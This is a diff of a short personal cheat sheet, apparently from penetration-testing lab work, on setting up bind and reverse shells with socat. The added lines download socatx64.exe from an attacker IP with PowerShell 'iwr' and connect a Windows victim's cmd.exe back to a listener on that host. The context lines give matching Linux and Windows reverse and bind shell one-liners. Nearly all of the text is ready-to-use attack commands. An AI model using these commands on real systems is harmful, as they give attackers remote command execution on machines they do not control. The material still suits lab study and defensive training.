@@ -3,6 +3,10 @@
 # Creating a smart shell What a waste of 2 hours figuring this out
 
 SOCAT
+
+upload it
+iwr -uri http://192.168.45.230/socatx64.exe -Outfile socat.exe
+
 Commands:
 Bind Shell
 Victim Linux: socat -d -d TCP4-LISTEN:4443 EXEC:/bin/bash
@@ -13,6 +17,11 @@ Reverse Shell
 Victim Linux: socat TCP4:192.168.168.1:4443 EXEC:/bin/bash
 Victim Windows: socat TCP4:192.168.1.1:4443 EXEC:'cmd.exe',pipes
 Attacker: socat -d -d TCP4-LISTEN:4443 STDOUT
+
+#Scratchpad -- ignore content in here
+socat -d -d TCP4-LISTEN:4443 STDOUT
+Victim Windows: socat.exe TCP4:192.168.45.230:4443 EXEC:'cmd.exe',pipes
+# Scratchpad end
 
 
 Python
